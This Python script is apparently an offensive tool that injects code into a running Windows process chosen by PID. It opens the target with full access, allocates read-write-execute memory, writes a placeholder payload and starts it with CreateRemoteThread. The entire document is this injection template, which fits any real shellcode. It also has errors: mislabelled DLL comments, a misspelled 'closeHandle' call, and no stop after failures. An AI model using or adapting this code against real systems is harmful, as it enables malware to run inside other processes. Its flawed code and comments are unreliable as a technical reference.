import ctypes
import sys

# Load kernel32.dll (Kernel32 is a 32-bit DLL)
kernel32 = ctypes.CDLL('kernel32')
ntdll = ctypes.CDLL('ntdll')  # Load ntdll.dll (Ntdll is a 64-bit DLL)

PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_RESERVE = 0x2000
MEM_COMMIT = 0x1000
PAGE_EXECUTE_READWRITE = 0x40


def main():
    k = "[+]"
    e = "[-]"
    i = "[*]"

    if len(sys.argv) < 2:
        print(f"{e} Usage: {sys.argv[0]} <PID to inject>")
        return

    dwPID = int(sys.argv[1])

    print(f"{i} Trying to get handle to process PID: {dwPID}")

    hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, dwPID)

    if hProcess == 0:
        print(
            f"{e} Failed to get handle to process, error: 0x{kernel32.GetLastError():X}")
        return

    print(f"{k} Got a handle to process\n\\--0x{hProcess:X}")

    hauntPuke = b"\xDE\xAD\xBE\xEF"
    hauntPukeSize = len(hauntPuke)

    rBuffer = kernel32.VirtualAllocEx(
        hProcess, 0, hauntPukeSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    print(f"{k} Allocated {hauntPukeSize}-bytes to the process memory w/ PAGE_EXECUTE_READWRITE permissions")

    if rBuffer == 0:
        print(f"{e} Failed to allocate buffer, error: 0x{kernel32.GetLastError():X}")

    kernel32.WriteProcessMemory(
        hProcess, rBuffer, hauntPuke, hauntPukeSize, None)
    print(f"{k} Wrote {hauntPukeSize}-bytes to allocated buffer")

    hThread = kernel32.CreateRemoteThread(
        hProcess, None, 0, rBuffer, None, 0, None)

    if hThread == 0:
        print(
            f"{e} Failed to get handle to the new thread, error: 0x{kernel32.GetLastError():X}")

    dwTID = kernel32.GetThreadId(hThread)
    print(
        f"{k} Got a handle to the newly created thread ({dwTID}\n\\---0x{hProcess:X}")

    print(f"{i} Waiting for thread to finish execution")
    kernel32.WaitForSingleObject(hThread, -1)
    print(f"{k} Thread finished execution, cleaning up")

    kernel32.CloseHandle(hThread)
    kernel32.closeHandle(hProcess)
    print(f"{k} Cleaned up, see you later! :x")


if __name__ == "__main__":
    main()
